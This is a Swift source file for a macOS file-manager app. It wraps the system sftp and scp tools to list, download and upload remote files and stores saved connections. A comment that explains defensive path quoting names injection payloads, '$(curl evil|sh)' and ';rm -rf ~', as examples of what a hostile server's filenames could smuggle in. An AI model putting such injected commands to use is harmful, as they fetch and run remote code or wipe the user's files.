import Foundation

/// Minimal SFTP client that shells out to the system `sftp` and `scp`
/// binaries. Authenticates via the user's existing SSH config and SSH agent
/// (we don't handle passwords ourselves — host-based, key-based, and
/// agent-based auth all "just work" because we're invoking the same client
/// the user already uses for ssh).
///
/// This is a deliberately small surface: list a directory, download a file,
/// upload a file. Full SFTP semantics (rename, chmod, etc.) are deferred.
enum SFTPClient {

    struct Connection: Hashable, Codable {
        let user: String
        let host: String
        let port: Int
        /// Optional starting directory; defaults to `~`.
        var remotePath: String

        var sshTarget: String { "\(user)@\(host)" }
        var displayName: String {
            "\(user)@\(host)\(port == 22 ? "" : ":\(port)"):\(remotePath.isEmpty ? "~" : remotePath)"
        }
    }

    struct Entry {
        let name: String
        let isDirectory: Bool
        let size: Int64
    }

    /// List entries at `path` on the given connection. Uses `sftp -b -` and
    /// parses the `ls -l`-style output.
    static func list(_ conn: Connection, path: String) -> [Entry] {
        var batch = ""
        batch += "cd \(escape(path.isEmpty ? "." : path))\n"
        batch += "ls -la\n"
        batch += "bye\n"
        let raw = run(conn, stdin: batch) ?? ""
        return parseLs(raw)
    }

    /// Download a single file to a local destination. Uses `scp`.
    @discardableResult
    static func download(_ conn: Connection, remotePath: String, to local: URL) -> Bool {
        let target = "\(conn.sshTarget):\(remoteQuote(remotePath))"
        let p = Process()
        p.launchPath = "/usr/bin/scp"
        var args = ["-q", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
        if conn.port != 22 { args.append(contentsOf: ["-P", "\(conn.port)"]) }
        args.append(contentsOf: [target, local.path])
        p.arguments = args
        do { try p.run() } catch { return false }
        p.waitUntilExit()
        return p.terminationStatus == 0
    }

    /// Upload a local file to a remote path.
    @discardableResult
    static func upload(_ conn: Connection, local: URL, to remotePath: String) -> Bool {
        let target = "\(conn.sshTarget):\(remoteQuote(remotePath))"
        let p = Process()
        p.launchPath = "/usr/bin/scp"
        var args = ["-q", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
        if conn.port != 22 { args.append(contentsOf: ["-P", "\(conn.port)"]) }
        args.append(contentsOf: [local.path, target])
        p.arguments = args
        do { try p.run() } catch { return false }
        p.waitUntilExit()
        return p.terminationStatus == 0
    }

    /// Quickly verify we can connect using existing creds. Returns nil on
    /// success, an error message otherwise.
    static func ping(_ conn: Connection) -> String? {
        let raw = run(conn, stdin: "pwd\nbye\n")
        if raw == nil || raw!.isEmpty { return "could not connect" }
        return nil
    }

    // MARK: - Internals

    private static func escape(_ s: String) -> String {
        "\"" + s.replacingOccurrences(of: "\"", with: "\\\"") + "\""
    }

    /// Single-quote a path for the remote shell that `scp` runs the source/target
    /// through — so a filename from a hostile server's `ls` listing can't inject
    /// remote commands (e.g. `$(curl evil|sh)` or `;rm -rf ~`).
    private static func remoteQuote(_ s: String) -> String {
        "'" + s.replacingOccurrences(of: "'", with: "'\\''") + "'"
    }

    private static func run(_ conn: Connection, stdin: String) -> String? {
        let p = Process()
        p.launchPath = "/usr/bin/sftp"
        var args = ["-b", "-", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
        if conn.port != 22 { args.append(contentsOf: ["-P", "\(conn.port)"]) }
        args.append(conn.sshTarget)
        p.arguments = args
        let inPipe = Pipe()
        let outPipe = Pipe()
        p.standardInput = inPipe
        p.standardOutput = outPipe
        p.standardError = FileHandle.nullDevice  // unused; nullDevice avoids a full-pipe deadlock
        do { try p.run() } catch { return nil }
        if let data = stdin.data(using: .utf8) {
            inPipe.fileHandleForWriting.write(data)
        }
        try? inPipe.fileHandleForWriting.close()
        let data = outPipe.fileHandleForReading.readDataToEndOfFile()
        p.waitUntilExit()
        return String(data: data, encoding: .utf8)
    }

    private static func parseLs(_ raw: String) -> [Entry] {
        var out: [Entry] = []
        for line in raw.split(separator: "\n") {
            let s = String(line)
            // Match the typical sftp `ls -la` output line:
            //   drwxr-xr-x   3 user  staff  4096 Jan  1 12:00 name
            //   -rw-r--r--   1 user  staff   123 Jan  1 12:00 file
            // 8 fields (perms links owner group size  Mon D time) then the name;
            // maxSplits keeps spaces in the name intact.
            let parts = s.split(separator: " ", maxSplits: 8, omittingEmptySubsequences: true).map(String.init)
            guard parts.count >= 9, parts[0].count >= 10 else { continue }   // >=10: allow trailing @/+ (xattr/ACL)
            let perm = parts[0]
            let isDir = perm.hasPrefix("d")
            let isLink = perm.hasPrefix("l")
            let size = Int64(parts[4]) ?? 0
            var name = parts[8]
            // A symlink line is "name -> target" — keep just the link's own name.
            if isLink, let r = name.range(of: " -> ") { name = String(name[..<r.lowerBound]) }
            if name == "." || name == ".." || name.isEmpty { continue }
            out.append(Entry(name: name, isDirectory: isDir,
                             size: isDir ? -1 : size))
        }
        return out
    }

    /// Test hook — exercises the `ls -la` parser without a live connection.
    static func testParseLs(_ raw: String) -> [Entry] { parseLs(raw) }
}

/// Persistent store of saved SFTP connections, surfaced in the sidebar.
enum SFTPBookmarks {
    private static let key = "FinderTwo.sftp.v1"

    static func all() -> [SFTPClient.Connection] {
        guard let data = UserDefaults.standard.data(forKey: key),
              let arr = try? JSONDecoder().decode([SFTPClient.Connection].self, from: data) else {
            return []
        }
        return arr
    }
    static func add(_ c: SFTPClient.Connection) {
        var arr = all().filter { $0.user != c.user || $0.host != c.host || $0.port != c.port }
        arr.append(c)
        if let data = try? JSONEncoder().encode(arr) {
            UserDefaults.standard.set(data, forKey: key)
        }
    }
    static func remove(user: String, host: String, port: Int) {
        let arr = all().filter { $0.user != user || $0.host != host || $0.port != port }
        if let data = try? JSONEncoder().encode(arr) {
            UserDefaults.standard.set(data, forKey: key)
        }
    }
}
